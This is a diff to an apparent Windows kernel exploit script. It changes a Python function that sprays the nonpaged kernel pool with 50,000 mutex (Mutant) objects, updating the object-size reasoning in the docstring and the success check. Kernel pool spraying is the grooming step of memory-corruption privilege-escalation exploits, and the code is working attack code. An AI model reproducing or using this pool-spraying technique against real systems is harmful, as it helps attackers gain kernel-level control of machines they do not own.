@@ -205,15 +205,15 @@ def get_handles():
 
 def we_can_spray():
     """
-    Spray the Kernel Pool with IoCompletionReserve and Event Objects. 
-    The IoCompletionReserve object is 0x60 and Event object is 0x40 bytes in length.
+    Spray the Kernel Pool with Mutant Objects. The Mutant object is 0x50 in length, 0x460 % 0x50 = 0.
     These are allocated from the Nonpaged kernel pool.
     """
     handles = []
     for i in range(0, 50000):
         handles.append(windll.kernel32.CreateMutexA(None, False, None))
+
     # could do with some better validation
-    if len(handles) > 0:
+    if len(handles) == 50000:
         return True
     return False
 
